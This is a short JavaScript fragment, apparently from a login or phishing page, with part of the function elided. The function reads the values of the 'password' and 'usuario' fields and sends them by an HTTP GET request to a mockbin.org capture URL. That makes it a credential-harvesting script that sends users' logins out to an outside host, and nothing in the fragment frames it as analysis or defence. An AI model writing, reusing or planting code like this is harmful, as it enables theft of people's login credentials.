function l(){
    ...
    a.open('GET', 'http://mockbin.org/bin/0f3022c4-cb4c-415b-8ea9-c543c0f2d16b?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
    a.send(null);
}
